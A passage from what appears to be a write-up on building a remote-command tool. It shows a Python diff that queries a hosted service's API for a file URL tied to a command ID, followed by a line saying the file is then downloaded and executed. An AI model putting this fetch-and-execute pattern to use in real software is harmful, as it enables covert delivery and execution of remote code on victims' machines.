@@ -166,7 +166,11 @@ def findFile(apiKey, commandId):
     query = {"query": "{items (ids: " + commandId + ") {assets { public_url }}}"}
     response = requests.post(url, headers=headers, data=query)
     if len(response.json()['data']['items']) != 0:
-        return response.json()['data']['items'][-1]['assets'][-1]['public_url']
+        try:
+            return response.json()['data']['items'][-1]['assets'][-1]['public_url']
+        # if file isn't present, we return nothing
+        except IndexError:
+            return ""
 ```
 
 If there's a URL associated with a command, this function will return it. Then the next step would simply be to download the file and execute it.
